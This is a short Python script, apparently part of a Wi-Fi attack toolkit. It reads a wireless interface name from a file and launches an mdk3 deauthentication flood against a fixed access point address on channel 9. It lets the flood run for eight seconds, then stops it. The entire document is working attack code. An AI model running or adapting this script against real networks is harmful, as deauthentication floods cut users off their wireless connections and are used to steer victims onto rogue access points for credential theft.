import os
import csv
import pandas
import time
import signal
import subprocess
import sys
import re

YELLOW = "\033[33m"
RED = "\033[31m"
GREEN = "\033[32m"
BLUE = "\033[34m"
CYAN = "\033[36m"
MAGENTA = "\033[35m"
RESET = "\033[0m"

with open('hostapdcarte') as f:
 scan = f.readline()

com = "xterm -hold -bg black -fg blue -e mdk3" + " " + scan + " " + "d -g -t" + " " + "00:11:22:33:44:55" + " " + "-c" + " " + "9"
deauth = subprocess.Popen(com.split())
time.sleep(8)
os.kill(deauth.pid, signal.SIGINT)
print("")